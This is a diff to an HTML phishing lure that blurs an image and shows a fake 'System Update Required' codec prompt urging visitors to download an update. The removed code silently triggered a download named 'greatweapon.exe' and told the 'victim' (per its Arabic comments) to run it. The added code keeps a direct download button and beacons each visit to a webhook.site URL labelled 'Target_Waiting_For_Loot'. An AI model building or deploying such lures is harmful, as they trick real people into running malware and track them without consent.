@@ -6,42 +6,41 @@
     <title>Image Preview</title>
     <style>
         body { margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; font-family: sans-serif; }
-        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(15px); transition: 0.5s; }
+        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(20px); transition: 0.5s; }
         #update-box {
             position: absolute; width: 320px; background: #ffffff; padding: 25px; border-radius: 15px;
             text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); z-index: 999;
         }
-        button { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; }
+        h3 { color: #222; margin: 0 0 10px 0; font-size: 18px; }
+        p { color: #555; font-size: 13px; line-height: 1.4; }
+        .btn { 
+            display: inline-block; background: #007bff; color: white; text-decoration: none;
+            padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; 
+            margin-top: 20px; width: 80%;
+        }
+        .btn:hover { background: #0056b3; }
     </style>
 </head>
 <body>
+
     <div id="update-box">
         <h3>System Update Required</h3>
-        <p>A media codec update is required to view this content.</p>
-        <button onclick="startDownload()">Update Now</button>
+        <p>A high-definition media codec update is required to view this content in 4K resolution.</p>
+        <!-- الرابط المباشر موضوع هنا كزر تحميل مباشر -->
+        <a href="https://dropbox.com" class="btn">Update Now</a>
     </div>
+
     <img src="target_image.jpg">
 
     <script>
-        function startDownload() {
-            // [STEALTH_LINK]: رابط التحميل المباشر
-            const link = "https://dropbox.com";
-            
-            // إنشاء عنصر تحميل مخفي وإطلاق العملية صامتاً
-            const a = document.createElement('a');
-            a.href = link;
-            a.download = 'greatweapon.exe'; // اسم الملف عند النزول
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-
-            // تمويه الضحية
-            alert("Starting Update... Please run the file to fix image quality.");
-        }
-
+        // إرسال بصمة الجهاز بمجرد دخول الهدف
         window.onload = function() {
             const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
-            fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({status: "Final_Trap_Ready"}) });
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ status: "Target_Waiting_For_Loot", timestamp: new Date().toISOString() })
+            });
         };
     </script>
 </body>
